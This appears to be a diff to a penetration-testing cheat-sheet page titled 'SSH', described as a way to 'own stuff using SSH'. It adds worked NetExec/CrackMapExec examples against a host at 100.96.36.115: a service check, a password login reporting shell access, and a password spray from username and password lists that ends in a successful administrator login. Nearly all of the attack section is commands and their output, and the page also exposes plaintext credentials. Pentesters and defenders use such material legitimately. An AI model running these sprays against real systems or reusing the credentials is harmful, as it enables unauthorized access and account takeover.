@@ -4,7 +4,7 @@ title : "SSH"
 description : "Own stuff using SSH."
 date : 2023-10-05T12:26:49+02:00
 # hidden : true
-draft : true
+# draft : true
 weight : 0
 tags : ['Framework', 'SSH']
 ---
@@ -76,6 +76,37 @@ Command Execution:
 
 ## Examples
 
-```plain
+### Checking SSH availability
 
+```plain
+$ nxc ssh 100.96.36.115  
+SSH         100.96.36.115   22     100.96.36.115    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
+```
+
+### Authentication with Password
+
+```plain
+$ nxc ssh 100.96.36.115 -u crypt0rr -p Welkom1234
+SSH         100.96.36.115   22     100.96.36.115    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
+SSH         100.96.36.115   22     100.96.36.115    [+] crypt0rr:Welkom1234  - shell access!
+```
+
+### Password Spray SSH
+
+{{%attachments fa_icon_class="far fa-file" pattern=".*(txt)"/%}}
+
+```plain
+$ cme ssh 100.96.36.115 -u usernames.txt -p passwords.txt 
+SSH         100.96.36.115     22     100.96.36.115      [*] SSH-2.0-OpenSSH_8.4p1 Ubuntu-6ubuntu2.1
+SSH         100.96.36.115     22     100.96.36.115      [-] 11111:admin Authentication failed.
+SSH         100.96.36.115     22     100.96.36.115      [-] 11111:root Authentication failed.
+SSH         100.96.36.115     22     100.96.36.115      [-] 11111:admin Authentication failed.
+SSH         100.96.36.115     22     100.96.36.115      [-] 11111:root Authentication failed.
+SSH         100.96.36.115     22     100.96.36.115      [-] 11111:Admin Authentication failed.
+SSH         100.96.36.115     22     100.96.36.115      [-] 11111:Admin Authentication failed.
+SSH         100.96.36.115     22     100.96.36.115      [-] 11111:x-admin Authentication failed.
+[...]
+SSH         100.96.36.115     22     100.96.36.115      [-] administrator:administrator Authentication failed.
+SSH         100.96.36.115     22     100.96.36.115      [-] administrator:welkom1234 Authentication failed.
+SSH         100.96.36.115     22     100.96.36.115      [+] administrator:x-admin 
 ```
